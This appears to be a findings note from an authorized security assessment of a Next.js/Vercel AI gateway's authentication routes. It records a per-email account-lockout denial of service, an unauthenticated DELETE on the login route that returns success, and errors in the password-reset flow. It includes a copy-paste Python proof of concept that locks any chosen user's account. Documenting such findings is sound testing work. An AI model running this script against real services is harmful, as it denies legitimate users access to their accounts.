# Non-ATO Account-Abuse — Verified Reproduction Recipes

Condensed from an authorized assessment of a Next.js/Vercel AI gateway.
All requests below were executed; responses are real, not hypothetical.

## A. Per-Email Account-Lockout DoS (verified High)
Endpoint: `POST /api/auth/login`, JSON `{"email":..., "password":...}`.

Burst at victim email — after ~6 attempts the account locks:
```
POST /api/auth/login {"email":"victim@example.com","password":"wrongpass"}
-> HTTP 401 {"error":{"message":"Account temporarily locked. Please try again later.","blocked":true,"resetTime":"2026-08-20T09:17:21.898Z"},"failedAttempts":6}
```
Scope test — a DIFFERENT email from the same IP is still allowed:
```
POST /api/auth/login {"email":"someone_else@example.com","password":"wrongpass"}
-> HTTP 401 {"error":{"message":"Invalid credentials. 4 attempts remaining.","blocked":false},"failedAttempts":6}
```
=> lock is keyed on **victim email**, not IP. Confirmed DoS primitive: unauthenticated attacker locks any registered user.

## B. HTTP-Method Anomaly on Auth Route (verified Medium)
```
OPTIONS /api/auth/login -> allow: DELETE, OPTIONS, POST
DELETE  /api/auth/login (no auth, body {}) -> HTTP 200 {"success":true}
PUT     /api/auth/login -> HTTP 405
TRACE   /api/auth/login -> HTTP 405
```
`DELETE` on a login route returning `success:true` is undefined auth behavior — audit server-side effect.

## C. Reset-Flow 500 Fragility (verified Medium)
```
POST /api/auth/forgot-password {"email":"valid@format.com"} -> HTTP 500 {"error":{"message":"Failed to process request."}}
POST /api/auth/forgot-password {"email":"notanemail"}       -> HTTP 400 {"error":{"message":"Invalid email address."}}
```
Valid-format emails (incl. non-existent) always 500; only malformed input gets a clean 400. Reset backend throws unhandled exceptions.

## Copy-paste PoC (lockout DoS)
```python
import argparse, json, urllib.request, urllib.error
BASE="https://TARGET"; EP="/api/auth/login"
def login(email, pw="wrongpass123!"):
    req=urllib.request.Request(BASE+EP, data=json.dumps({"email":email,"password":pw}).encode(),
        headers={"Content-Type":"application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as r: return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read())
        except: return e.code, {}
ap=argparse.ArgumentParser(); ap.add_argument("--email",required=True); ap.add_argument("--attempts",type=int,default=6)
a=ap.parse_args()
for i in range(1,a.attempts+1):
    c,b=login(a.email); print(f"req {i}: HTTP {c} blocked={b.get('error',{}).get('blocked')} {b}")
    if b.get("error",{}).get("blocked"): print("[+] Locked."); break
```

## Coverage gaps to record (not "clean" results)
- SQLi: sqlmap install broken in that env (`python` missing / "missing modules") -> note as gap.
- dalfox/katana flag drift across versions -> verify with `--help`.
- aggregate_reports.py expected `/workspace/reports/<target>`; copy there first.
